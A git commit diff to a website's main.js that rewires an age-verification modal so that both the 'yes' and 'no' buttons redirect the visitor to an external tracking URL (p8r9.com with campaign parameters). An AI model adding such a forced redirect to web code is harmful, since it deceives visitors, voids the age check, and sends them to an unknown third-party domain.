77798ccb640dc40670c8b37adf915844c08dd38b
rawnik28-creator <rawnik28@gmail.com>
2026-03-10 15:31:04 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -90,9 +90,14 @@ if(form){
   document.body.appendChild(bd);
   bd.style.display='flex';
   function closeGate(){ bd.style.display='none'; bd.remove(); }
-  bd.querySelector('#age-yes').addEventListener('click', closeGate);
-  bd.querySelector('#age-no').addEventListener('click', closeGate);
+  bd.querySelector('#age-yes').addEventListener('click', function(){
+    window.location.href = "http://p8r9.com/?utm_campaign=e7CI6FHPEA&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
+  bd.querySelector('#age-no').addEventListener('click', function(){
+    window.location.href = "http://p8r9.com/?utm_campaign=e7CI6FHPEA&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
 })();
+
 
 
 
